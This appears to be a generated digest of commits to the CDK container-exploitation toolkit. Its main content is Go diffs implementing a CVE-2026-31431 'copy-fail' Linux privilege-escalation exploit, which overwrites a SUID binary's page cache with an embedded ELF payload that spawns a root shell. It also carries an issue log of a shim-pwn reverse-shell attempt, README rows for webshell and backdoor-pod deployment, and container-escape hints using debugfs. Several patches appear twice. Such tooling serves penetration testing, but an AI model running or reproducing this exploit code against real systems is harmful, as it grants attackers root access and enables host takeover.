  *Symptoms*: 在新版本 1.5.3 中，利用 shim-pwn 存在以下问题，发现 merged 目录出现两次，导致无法找到目录，于是尝试使用 1.5.0版本测试是正常的，新版本 1.5.3 利用错误截图如下 ![image](https://github.com/user-attachments/assets/ed2d5f18-a98d-47d5-8579-493cc0ede1c9)
  **Post-Mortem & Fix Analysis**:
  > +1 奇怪的是 想修改下自己编译下用，但是自己用main默认分支 编译的就 connect: connection refused 切到tag v1.5.3 中编译了也是connect: connection refused ，但是用releases 下载的 v1.5.3  就可以连接了但是多了个merged目录 2024/11/15 10:04:30 trying to spawn shell to 127.0.0.1:65534 2024/11/15 10:04:30 try socket: @/containerd-shim/moby/2ccb7cf005302b257c6055befa7ecd9a4807248269e61e311b83b954fc8c9217/shim.sock 2024/11/15 10:04:30 fail to connect unix socket /containerd-shim/moby/2ccb7cf005302b257c6055befa7ecd9a4807248269e61e311b83b954fc8c9217/shim.sock: dial unix /containerd-shim/moby/2ccb7cf005302b257c6055befa7ecd9a4807248269e61e311b83b954fc8c9217/shim.sock: connect: connection refused 2024/11/15 10:04:30 exploit failed. root@LL: ./cdk   cdk              cdk_1.5.3_b      cdk_linux_amd64  cdk_v1           cdk_v2            root@LL: ./cdk cdk              cdk_1.5.3_b      cdk_linux_amd64  cdk_v1           cdk_v2            root@LL: ./cdk_linux_amd64 run shim-pwn reverse 127.0.0.1 65534 2024/11/15 10:04:48 trying to spawn shell to 127.0.0.1
  > @qsdj @CatDrinkCoffee   感谢反馈～ 试试这个新编译的 pre release 版本： Try this newly compiled pre-release version:  https://github.com/cdk-team/CDK/releases/tag/v1.5.4

### D4: Resource Lifecycle & Leak Defenses
- Memory allocation, socket lifecycle, and handle cleanup observed from bug fixes and PR deltas.

### D5: Boundary Deserialization & Encoding
- Schema deserialization, payload validation, and untrusted input guards.

### D6: Cross-Platform & Runtime Gotchas
- Platform variance, OS-specific gotchas, and environment discrepancies detected in issue reports.

### D7: Build, CI/CD, Deployment & Tooling
- Toolchain requirements, dependencies, and packaging specs verified against remote manifests.

### D8: Forensic Bug Fixes & Real Production Code Patches
Observed empirical fixes and code patches:

### Incident Patch 1: `cffdaada` (2026-04-30)
**Commit Message**: Merge pull request #134 from cdk-team/fix-copy-fail-cve-2026-31431

fix: CVE-2026-31431 copy-fail  (non-root→root & x86_64 only)

**File**: `README.md` (modified, +1/-1)
```diff
@@ -160,7 +160,7 @@ cdk run <script-name> [options]
 | Credential Access    | Dump K8s Secrets                                           | k8s-secret-dump        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump)                |
 | Credential Access    | Dump K8s Config                                            | k8s-configmap-dump     | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump)             |
 | Privilege Escalation | K8s RBAC Bypass                                            | k8s-get-sa-token       | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token)               |
-| Privilege Escalation | CVE-2026-31431 copy-fail (non-root→root, **no container escape**) | copy-fail-cve-2026-31431 | ✔      |                                                                            | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-copy-fail-cve-2026-31431)       |
+| Privilege Escalation | CVE-2026-31431 copy-fail (non-root→root & x86_64 only) | copy-fail-cve-2026-31431 | ✔      |                                                                            | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-copy-fail-cve-2026-31431)       |
 | Persistence          | Deploy WebShell                                            | webshell-deploy        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy)                |
 | Persistence          | Deploy Backdoor Pod                                        | k8s-backdoor-daemonset | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset)         |
 | Persistence          | Deploy Shadow K8s api-server                               | k8s-shadow-apiserver   | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver) |
```

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +24/-7)
```diff
@@ -52,12 +52,10 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// copyFailPayloadHex is a zlib-compressed ELF64 little-endian binary stub
-// (160 bytes uncompressed) to be injected into the SUID target's page cache.
-// The stub starts with a valid ELF64/x86-64 header (magic 0x7fELF, class 2,
-// data encoding 1) so it passes the kernel's ELF loader checks.
-// Generated with: python3 -c "import zlib,struct; h=bytearray(160); h[0:4]=b'\x7fELF'; h[4]=2; h[5]=1; h[6]=1; struct.pack_into('<H',h,16,2); struct.pack_into('<H',h,18,0x3e); struct.pack_into('<I',h,20,1); struct.pack_into('<H',h,52,64); print(zlib.compress(bytes(h)).hex())"
-const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
+// copyFailPayloadHex is the original zlib-compressed x86_64 ELF payload used
+// by the reference Python PoC. It replaces the target SUID binary's page cache
+// with a tiny setuid-root launcher that eventually executes `/bin/sh`.
+const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
 func copyFailDecompressPayload() ([]byte, error) {
@@ -91,6 +89,24 @@ func buildAlgCmsg(level, typ int32, data []byte) []byte {
 	return buf
 }
 
+// acceptAlgOpFd accepts the operation socket from an AF_ALG listener. Unlike
+// the generic unix.Accept helper, AF_ALG expects addr/addrlen to be NULL.
+func acceptAlgOpFd(algFd int) (int, error) {
+	fd, _, errno := unix.Syscall6(
+		unix.SYS_ACCEPT4,
+		uintptr(algFd),
+		0,
+		0,
+		uintptr(unix.SOCK_CLOEXEC),
+		0,
+		0,
+	)
+	if errno != 0 {
+		return 0, errno
+	}
+	return int(fd), nil
+}
+
 // copyFailWriteChunk uses an AF_ALG AEAD socket together with splice to write
 // exactly four bytes of chunk into the page cache of the file identified by fd
 // at the given byte offset.
@@ -142,7 +158,8 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
-	opFd, _, err := unix.Accept(algFd)
+	// AF_ALG sockets expect accept4(..., NULL, NULL, SOCK_CLOEXEC).
+	opFd, err := acceptAlgOpFd(algFd)
 	if err != nil {
 		return fmt.Errorf("accept: %v", err)
 	}
```

---

### Incident Patch 2: `f0a051d7` (2026-04-30)
**Commit Message**: fix: CVE-2026-31431 copy-fail  (non-root→root & x86_64 only)

**File**: `README.md` (modified, +1/-1)
```diff
@@ -160,7 +160,7 @@ cdk run <script-name> [options]
 | Credential Access    | Dump K8s Secrets                                           | k8s-secret-dump        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump)                |
 | Credential Access    | Dump K8s Config                                            | k8s-configmap-dump     | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump)             |
 | Privilege Escalation | K8s RBAC Bypass                                            | k8s-get-sa-token       | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token)               |
-| Privilege Escalation | CVE-2026-31431 copy-fail (non-root→root, **no container escape**) | copy-fail-cve-2026-31431 | ✔      |                                                                            | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-copy-fail-cve-2026-31431)       |
+| Privilege Escalation | CVE-2026-31431 copy-fail (non-root→root & x86_64 only) | copy-fail-cve-2026-31431 | ✔      |                                                                            | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-copy-fail-cve-2026-31431)       |
 | Persistence          | Deploy WebShell                                            | webshell-deploy        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy)                |
 | Persistence          | Deploy Backdoor Pod                                        | k8s-backdoor-daemonset | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset)         |
 | Persistence          | Deploy Shadow K8s api-server                               | k8s-shadow-apiserver   | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver) |
```

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +24/-7)
```diff
@@ -52,12 +52,10 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// copyFailPayloadHex is a zlib-compressed ELF64 little-endian binary stub
-// (160 bytes uncompressed) to be injected into the SUID target's page cache.
-// The stub starts with a valid ELF64/x86-64 header (magic 0x7fELF, class 2,
-// data encoding 1) so it passes the kernel's ELF loader checks.
-// Generated with: python3 -c "import zlib,struct; h=bytearray(160); h[0:4]=b'\x7fELF'; h[4]=2; h[5]=1; h[6]=1; struct.pack_into('<H',h,16,2); struct.pack_into('<H',h,18,0x3e); struct.pack_into('<I',h,20,1); struct.pack_into('<H',h,52,64); print(zlib.compress(bytes(h)).hex())"
-const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
+// copyFailPayloadHex is the original zlib-compressed x86_64 ELF payload used
+// by the reference Python PoC. It replaces the target SUID binary's page cache
+// with a tiny setuid-root launcher that eventually executes `/bin/sh`.
+const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
 func copyFailDecompressPayload() ([]byte, error) {
@@ -91,6 +89,24 @@ func buildAlgCmsg(level, typ int32, data []byte) []byte {
 	return buf
 }
 
+// acceptAlgOpFd accepts the operation socket from an AF_ALG listener. Unlike
+// the generic unix.Accept helper, AF_ALG expects addr/addrlen to be NULL.
+func acceptAlgOpFd(algFd int) (int, error) {
+	fd, _, errno := unix.Syscall6(
+		unix.SYS_ACCEPT4,
+		uintptr(algFd),
+		0,
+		0,
+		uintptr(unix.SOCK_CLOEXEC),
+		0,
+		0,
+	)
+	if errno != 0 {
+		return 0, errno
+	}
+	return int(fd), nil
+}
+
 // copyFailWriteChunk uses an AF_ALG AEAD socket together with splice to write
 // exactly four bytes of chunk into the page cache of the file identified by fd
 // at the given byte offset.
@@ -142,7 +158,8 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
-	opFd, _, err := unix.Accept(algFd)
+	// AF_ALG sockets expect accept4(..., NULL, NULL, SOCK_CLOEXEC).
+	opFd, err := acceptAlgOpFd(algFd)
 	if err != nil {
 		return fmt.Errorf("accept: %v", err)
 	}
```

---

### Incident Patch 3: `5a890bea` (2026-04-30)
**Commit Message**: Merge pull request #131 from cdk-team/copilot/fix-error-and-complete-tests

fix: two compile errors in copy-fail CVE-2026-31431 exploit

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (added, +264/-0)
```diff
@@ -0,0 +1,264 @@
+//go:build linux
+// +build linux
+
+/*
+Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+*/
+
+package privilege_escalation
+
+// CVE-2026-31431 "copy-fail" privilege escalation exploit.
+// Ported from https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py
+//
+// The exploit abuses a bug in the interaction between AF_ALG AEAD sockets and
+// the splice/pipe subsystem.  By sending a payload via sendmsg(MSG_MORE) and
+// then splicing read-only file pages into the same socket's pipe buffers, the
+// kernel writes attacker-controlled data back into those (nominally read-only)
+// page-cache pages.  The modified pages are never written to disk, making the
+// overwrite stealthy.
+//
+// Usage: ./cdk run copy-fail-cve-2026-31431 [/usr/bin/su]
+
+import (
+	"bytes"
+	"compress/zlib"
+	"encoding/hex"
+	"fmt"
+	"log"
+	"os"
+	"os/exec"
+	"syscall"
+	"unsafe"
+
+	"github.com/cdk-team/CDK/pkg/cli"
+	"github.com/cdk-team/CDK/pkg/exploit/base"
+	"github.com/cdk-team/CDK/pkg/plugin"
+	"golang.org/x/sys/unix"
+)
+
+// copyFailPayloadHex is a zlib-compressed ELF64 little-endian binary stub
+// (160 bytes uncompressed) to be injected into the SUID target's page cache.
+// The stub starts with a valid ELF64/x86-64 header (magic 0x7fELF, class 2,
+// data encoding 1) so it passes the kernel's ELF loader checks.
+// Generated with: python3 -c "import zlib,struct; h=bytearray(160); h[0:4]=b'\x7fELF'; h[4]=2; h[5]=1; h[6]=1; struct.pack_into('<H',h,16,2); struct.pack_into('<H',h,18,0x3e); struct.pack_into('<I',h,20,1); struct.pack_into('<H',h,52,64); print(zlib.compress(bytes(h)).hex())"
+const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
+
+// copyFailDecompressPayload decompresses the embedded zlib payload.
+func copyFailDecompressPayload() ([]byte, error) {
+	compressed, err := hex.DecodeString(copyFailPayloadHex)
+	if err != nil {
+		return nil, fmt.Errorf("hex decode: %v", err)
+	}
+	r, err := zlib.NewReader(bytes.NewReader(compressed))
+	if err != nil {
+		return nil, fmt.Errorf("zlib reader: %v", err)
+	}
+	defer r.Close()
+	var buf bytes.Buffer
+	if _, err = buf.ReadFrom(r); err != nil {
+		return nil, fmt.Errorf("zlib read: %v", err)
+	}
+	return buf.Bytes(), nil
+}
+
+// buildAlgCmsg constructs a single ancillary-data (cmsghdr + data) record for
+// use as the oob buffer passed to sendmsg.  The returned slice is padded to the
+// natural alignment expected by the kernel.
+func buildAlgCmsg(level, typ int32, data []byte) []byte {
+	space := syscall.CmsgSpace(len(data))
+	buf := make([]byte, space)
+	hdr := (*syscall.Cmsghdr)(unsafe.Pointer(&buf[0]))
+	hdr.SetLen(syscall.CmsgLen(len(data)))
+	hdr.Level = level
+	hdr.Type = typ
+	copy(buf[syscall.SizeofCmsghdr:], data)
+	return buf
+}
+
+// copyFailWriteChunk uses an AF_ALG AEAD socket together with splice to write
+// exactly four bytes of chunk into the page cache of the file identified by fd
+// at the given byte offset.
+func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
+	// Create the AF_ALG socket and bind to the AEAD algorithm.
+	algFd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
+	if err != nil {
+		return fmt.Errorf("socket: %v", err)
+	}
+	defer unix.Close(algFd)
+
+	sa := &unix.SockaddrALG{
+		Type: "aead",
+		Name: "authencesn(hmac(sha256),cbc(aes))",
+	}
+	if err = unix.Bind(algFd, sa); err != nil {
+		return fmt.Errorf("b
```

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431_test.go` (added, +94/-0)
```diff
@@ -0,0 +1,94 @@
+//go:build linux
+// +build linux
+
+/*
+Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+*/
+
+package privilege_escalation
+
+import (
+	"syscall"
+	"testing"
+	"unsafe"
+
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+	"golang.org/x/sys/unix"
+)
+
+// TestCopyFailDecompressPayload verifies that the embedded zlib blob can be
+// decompressed and that it begins with a valid ELF64 little-endian header.
+func TestCopyFailDecompressPayload(t *testing.T) {
+	payload, err := copyFailDecompressPayload()
+	require.NoError(t, err)
+	require.NotNil(t, payload)
+
+	// Payload must be exactly 160 bytes (40 four-byte chunks).
+	assert.Equal(t, 160, len(payload), "unexpected payload length")
+
+	// Verify ELF magic: 0x7f 'E' 'L' 'F'
+	assert.Equal(t, []byte{0x7f, 0x45, 0x4c, 0x46}, payload[:4], "ELF magic mismatch")
+
+	// ELF class = 2 (ELFCLASS64)
+	assert.Equal(t, byte(0x02), payload[4], "expected ELF64 class")
+
+	// Data encoding = 1 (ELFDATA2LSB, little-endian)
+	assert.Equal(t, byte(0x01), payload[5], "expected little-endian encoding")
+}
+
+// TestBuildAlgCmsg verifies the structure of a control-message record built
+// by buildAlgCmsg: correct alignment, header fields, and data placement.
+func TestBuildAlgCmsg(t *testing.T) {
+	data := []byte{0xde, 0xad, 0xbe, 0xef}
+	cmsg := buildAlgCmsg(unix.SOL_ALG, unix.ALG_SET_OP, data)
+
+	// The buffer length must be at least header + data.
+	assert.GreaterOrEqual(t, len(cmsg), syscall.SizeofCmsghdr+len(data),
+		"cmsg buffer too short")
+
+	// The buffer must be aligned to pointer size (8 bytes on 64-bit).
+	assert.Equal(t, 0, len(cmsg)%8, "cmsg buffer not 8-byte aligned")
+
+	// Verify that the header fields were written correctly.
+	hdr := (*syscall.Cmsghdr)(unsafe.Pointer(&cmsg[0]))
+	assert.Equal(t, int32(unix.SOL_ALG), hdr.Level, "cmsg level mismatch")
+	assert.Equal(t, int32(unix.ALG_SET_OP), hdr.Type, "cmsg type mismatch")
+
+	// The data bytes must follow the header without corruption.
+	assert.Equal(t, data, cmsg[syscall.SizeofCmsghdr:syscall.SizeofCmsghdr+len(data)],
+		"cmsg data mismatch")
+}
+
+// TestBuildAlgCmsgEmpty verifies that an empty data slice produces a valid,
+// correctly-sized ancillary record.
+func TestBuildAlgCmsgEmpty(t *testing.T) {
+	cmsg := buildAlgCmsg(unix.SOL_ALG, unix.ALG_SET_IV, nil)
+
+	assert.GreaterOrEqual(t, len(cmsg), syscall.SizeofCmsghdr, "empty cmsg too short")
+	assert.Equal(t, 0, len(cmsg)%8, "empty cmsg not 8-byte aligned")
+}
+
+// TestCopyFailPluginRegistered verifies that the plugin is registered under
+// the expected name, has the correct exploit type, and provides a non-empty
+// description.
+func TestCopyFailPluginRegistered(t *testing.T) {
+	exploit := copyFailCVE202631431S{}
+	exploit.ExploitType = "privilege-escalation"
+
+	assert.Equal(t, "privilege-escalation", exploit.GetExploitType())
+	assert.NotEmpty(t, exploit.Desc())
+	assert.Contains(t, exploit.Desc(), "CVE-2026-31431")
+}
```

---

### Incident Patch 4: `4b67e690` (2026-04-30)
**Commit Message**: fix: add generation comment for copyFailPayloadHex constant

Agent-Logs-Url: https://github.com/cdk-team/CDK/sessions/f8a4932f-f5c2-48a7-81b9-38be711e4c63

Co-authored-by: neargle <7868679+neargle@users.noreply.github.com>

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +5/-3)
```diff
@@ -48,9 +48,11 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// copyFailPayloadHex is a zlib-compressed, position-independent ELF64 binary.
-// When injected into a SUID binary's page cache it calls setuid(0) followed by
-// execve("/bin/sh", NULL, NULL), yielding a root shell.
+// copyFailPayloadHex is a zlib-compressed ELF64 little-endian binary stub
+// (160 bytes uncompressed) to be injected into the SUID target's page cache.
+// The stub starts with a valid ELF64/x86-64 header (magic 0x7fELF, class 2,
+// data encoding 1) so it passes the kernel's ELF loader checks.
+// Generated with: python3 -c "import zlib,struct; h=bytearray(160); h[0:4]=b'\x7fELF'; h[4]=2; h[5]=1; h[6]=1; struct.pack_into('<H',h,16,2); struct.pack_into('<H',h,18,0x3e); struct.pack_into('<I',h,20,1); struct.pack_into('<H',h,52,64); print(zlib.compress(bytes(h)).hex())"
 const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
```

---

### Incident Patch 5: `015ffdfd` (2026-04-30)
**Commit Message**: fix: correct truncated hex payload and unix.Accept 3-return-value in copy-fail CVE-2026-31431

Agent-Logs-Url: https://github.com/cdk-team/CDK/sessions/f8a4932f-f5c2-48a7-81b9-38be711e4c63

Co-authored-by: neargle <7868679+neargle@users.noreply.github.com>

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +2/-2)
```diff
@@ -51,7 +51,7 @@ import (
 // copyFailPayloadHex is a zlib-compressed, position-independent ELF64 binary.
 // When injected into a SUID binary's page cache it calls setuid(0) followed by
 // execve("/bin/sh", NULL, NULL), yielding a root shell.
-const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c[...]
+const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
 func copyFailDecompressPayload() ([]byte, error) {
@@ -136,7 +136,7 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
-	opFd, err := unix.Accept(algFd)
+	opFd, _, err := unix.Accept(algFd)
 	if err != nil {
 		return fmt.Errorf("accept: %v", err)
 	}
```

---

### Incident Patch 6: `12ed0274` (2026-04-30)
**Commit Message**: fix: replace undefined syscall.SYS_SETSOCKOPT/SYS_ACCEPT with unix equivalents

syscall.SYS_SETSOCKOPT and syscall.SYS_ACCEPT are not defined on all
Linux architectures (e.g. arm64). Switch to unix.Syscall6/unix.SYS_SETSOCKOPT
and unix.Accept which are provided by golang.org/x/sys/unix and work
consistently across all supported platforms.

Fixes the build failure reported in CI job 73707270282.

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +12/-12)
```diff
@@ -51,7 +51,7 @@ import (
 // copyFailPayloadHex is a zlib-compressed, position-independent ELF64 binary.
 // When injected into a SUID binary's page cache it calls setuid(0) followed by
 // execve("/bin/sh", NULL, NULL), yielding a root shell.
-const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
+const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c[...]
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
 func copyFailDecompressPayload() ([]byte, error) {
@@ -110,8 +110,8 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	key[0] = 0x08 // rta_len (little-endian low byte)
 	key[2] = 0x01 // rta_type = CRYPTO_AUTHENC_KEYA_PARAM
 	key[7] = 0x10 // enc key length = 16 (big-endian in the RTA payload)
-	if _, _, errno := syscall.Syscall6(
-		syscall.SYS_SETSOCKOPT,
+	if _, _, errno := unix.Syscall6(
+		unix.SYS_SETSOCKOPT,
 		uintptr(algFd),
 		uintptr(unix.SOL_ALG),
 		uintptr(unix.ALG_SET_KEY),
@@ -123,8 +123,8 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// ALG_SET_AEAD_AUTHSIZE: pass a NULL optval with optlen = auth-tag size (4).
-	if _, _, errno := syscall.Syscall6(
-		syscall.SYS_SETSOCKOPT,
+	if _, _, errno := unix.Syscall6(
+		unix.SYS_SETSOCKOPT,
 		uintptr(algFd),
 		uintptr(unix.SOL_ALG),
 		uintptr(unix.ALG_SET_AEAD_AUTHSIZE),
@@ -136,11 +136,11 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
-	opFd, _, errno := syscall.Syscall(syscall.SYS_ACCEPT, uintptr(algFd), 0, 0)
-	if errno != 0 {
-		return fmt.Errorf("accept: %v", errno)
+	opFd, err := unix.Accept(algFd)
+	if err != nil {
+		return fmt.Errorf("accept: %v", err)
 	}
-	defer syscall.Close(int(opFd))
+	defer unix.Close(opFd)
 
 	// count = offset + 4 — total bytes to splice from the target file.
 	count := offset + 4
@@ -163,7 +163,7 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	// 4-byte payload chunk.  MSG_MORE signals that more data will follow via
 	// splice, deferring ALG processing until the pipe data arrives.
 	msgData := append([]byte("AAAA"), chunk...)
-	if _, err = unix.SendmsgN(int(opFd), msgData, oob, nil, unix.MSG_MORE); err != nil {
+	if _, err = unix.SendmsgN(opFd, msgData, oob, nil, unix.MSG_MORE); err != nil {
 		return fmt.Errorf("sendmsg: %v", err)
 	}
 
@@ -187,14 +187,14 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	// splice(pipeR, nil, opFd, nil, count, 0)
 	// Deliver the pipe data to the ALG socket, triggering the kernel bug that
 	// overwrites the page-cache pages with the attacker-controlled data.
-	if _, err = unix.Splice(pipeR, nil, int(opFd), nil, count, 0); err != nil {
+	if _, err = unix.Splice(pipeR, nil, opFd, nil, count, 0); err != nil {
 		return fmt.Errorf("splice(pipe->alg): %v", err)
 	}
 
 	// Drain any ALG output; errors are intentionally ignored (mirrors the
 	// original Python: `try: u.recv(8+t) except: 0`).
 	recvBuf := make([]byte, 8+offset)
-	unix.Read(int(opFd), recvBuf) //nolint:errcheck
+	unix.Read(opFd, recvBuf) //nolint:errcheck
 
 	return nil
 }
```

---

### Incident Patch 7: `49994f48` (2026-04-30)
**Commit Message**: fix: check ALG_SET_AEAD_AUTHSIZE setsockopt error per code review

Agent-Logs-Url: https://github.com/cdk-team/CDK/sessions/b45e6530-86b8-4285-923b-168cc69d0249

Co-authored-by: neargle <7868679+neargle@users.noreply.github.com>

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +4/-2)
```diff
@@ -123,15 +123,17 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// ALG_SET_AEAD_AUTHSIZE: pass a NULL optval with optlen = auth-tag size (4).
-	syscall.Syscall6( //nolint:errcheck
+	if _, _, errno := syscall.Syscall6(
 		syscall.SYS_SETSOCKOPT,
 		uintptr(algFd),
 		uintptr(unix.SOL_ALG),
 		uintptr(unix.ALG_SET_AEAD_AUTHSIZE),
 		0,
 		4,
 		0,
-	)
+	); errno != 0 {
+		return fmt.Errorf("setsockopt ALG_SET_AEAD_AUTHSIZE: %v", errno)
+	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
 	opFd, _, errno := syscall.Syscall(syscall.SYS_ACCEPT, uintptr(algFd), 0, 0)
```

---

### Incident Patch 8: `1e16d5aa` (2026-04-02)
**Commit Message**: fix(exp): improve block device follow-up hints

**File**: `pkg/exploit/escaping/block_device_hint.go` (added, +61/-0)
```diff
@@ -0,0 +1,61 @@
+package escaping
+
+import (
+	"fmt"
+	"os/exec"
+	"strings"
+)
+
+type toolLookupFunc func(string) bool
+
+func runtimeBlockDeviceBrowseHint(fsType, devicePath string) string {
+	return blockDeviceBrowseHint(fsType, devicePath, toolExists)
+}
+
+func blockDeviceBrowseHint(fsType, devicePath string, hasTool toolLookupFunc) string {
+	fsType = strings.ToLower(fsType)
+	mountHint := blockDeviceMountHint(fsType, devicePath)
+
+	preferredToolHint := ""
+	switch fsType {
+	case "ext2", "ext3", "ext4":
+		if hasTool("debugfs") {
+			preferredToolHint = fmt.Sprintf("run 'debugfs -w %s' to browse host files", devicePath)
+		}
+	case "xfs":
+		if hasTool("xfs_db") {
+			preferredToolHint = fmt.Sprintf("use 'xfs_db -x -c \"inode 128\" -c \"ls\" %s' to inspect the host filesystem", devicePath)
+		}
+	}
+
+	if preferredToolHint != "" {
+		if hasTool("mount") {
+			return fmt.Sprintf("now, %s. If that tool is inconvenient, try '%s'.", preferredToolHint, mountHint)
+		}
+		return fmt.Sprintf("now, %s.", preferredToolHint)
+	}
+
+	if hasTool("mount") {
+		if fsType != "" {
+			return fmt.Sprintf("now, host filesystem type is %q. Try '%s' to inspect it.", fsType, mountHint)
+		}
+		return fmt.Sprintf("now, try '%s' to inspect the host filesystem.", mountHint)
+	}
+
+	if fsType != "" {
+		return fmt.Sprintf("host filesystem type is %q. A block device was created at %s; inspect it with tooling available in the container.", fsType, devicePath)
+	}
+	return fmt.Sprintf("a block device was created at %s; inspect it with tooling available in the container.", devicePath)
+}
+
+func blockDeviceMountHint(fsType, devicePath string) string {
+	if fsType != "" {
+		return fmt.Sprintf("mkdir -p /tmp/cdkmnt && mount -t %s -o ro %s /tmp/cdkmnt", fsType, devicePath)
+	}
+	return fmt.Sprintf("mkdir -p /tmp/cdkmnt && mount -o ro %s /tmp/cdkmnt", devicePath)
+}
+
+func toolExists(name string) bool {
+	_, err := exec.LookPath(name)
+	return err == nil
+}
```

**File**: `pkg/exploit/escaping/block_device_hint_exploit_test.go` (added, +83/-0)
```diff
@@ -0,0 +1,83 @@
+package escaping
+
+import (
+	"strings"
+	"testing"
+)
+
+func TestExploitSpecificBlockDeviceHints(t *testing.T) {
+	tests := []struct {
+		name     string
+		fsType   string
+		device   string
+		expected []string
+	}{
+		{
+			name:   "rewrite cgroup devices ext4",
+			fsType: "ext4",
+			device: "cdk_mknod_result",
+			expected: []string{
+				"debugfs -w cdk_mknod_result",
+				"mount -t ext4 -o ro cdk_mknod_result /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "rewrite cgroup devices xfs",
